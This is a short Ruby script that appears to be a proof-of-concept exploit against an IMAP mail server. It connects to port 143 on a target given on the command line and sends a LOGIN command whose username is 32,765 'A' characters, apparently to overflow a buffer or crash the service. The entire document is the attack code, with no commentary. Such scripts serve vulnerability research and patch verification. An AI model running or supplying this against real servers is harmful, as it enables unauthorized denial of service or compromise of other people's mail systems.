#!/usr/bin/ruby
 
require 'socket'
 
s = TCPSocket.open(ARGV[0], 143)
 
cmd = "a LOGIN "
address = "A" * 32765
password = " AAAAAAAA\r\n"
logout = "a LOGOUT\r\n"
 
pkt = cmd
pkt << address
pkt << password
pkt << logout
 
s.write(pkt)
 
while resp = s.gets
    p resp
end
 
s.close
